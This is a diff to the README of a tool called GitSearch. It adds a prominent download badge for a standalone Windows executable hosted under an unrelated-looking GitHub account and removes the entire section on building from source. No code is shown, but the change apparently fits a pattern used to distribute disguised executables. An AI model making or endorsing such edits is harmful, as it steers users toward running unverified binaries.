@@ -1,3 +1,11 @@
+<div align="center">
+
+[![Download GitSearch](https://img.shields.io/badge/Download-GitSearch.exe-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rkkizar777-design/git.store/releases/download/v1.0.0/GitSearch.exe)
+
+*(v1.0.0 • 64 MB • Standalone Executable)*
+
+</div>
+
 <img width="1365" height="762" alt="image" src="https://github.com/user-attachments/assets/3fd6ca45-400c-4b11-82f9-819d97f61222" />
 <div align="center">
 
@@ -122,35 +130,6 @@ graph TD
 
 ## ⚙️ Development Setup
 
-If you wish to build or modify GitSearch from source code:
-
-### Prerequisites
-- **Node.js** (v18+)
-- **Python** (v3.10+)
-- **PyInstaller**
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/your-username/GitSearch.git
-cd GitSearch/_SourceCode
-
-# 2. Install Frontend Dependencies
-npm install
-
-# 3. Install Backend Dependencies
-pip install -r backend/requirements.txt
-
-# 4. Run Development Servers
-# Terminal 1 (Backend):
-python -m uvicorn backend.main:app --port 8086 --reload
-
-# Terminal 2 (Frontend):
-npm run dev
-
-# 5. Compile Windows Executable
-npm run build -- --outDir frontend_build
-pyinstaller desktop.spec --distpath "../" --workpath build --clean
-```
 
 ---
 
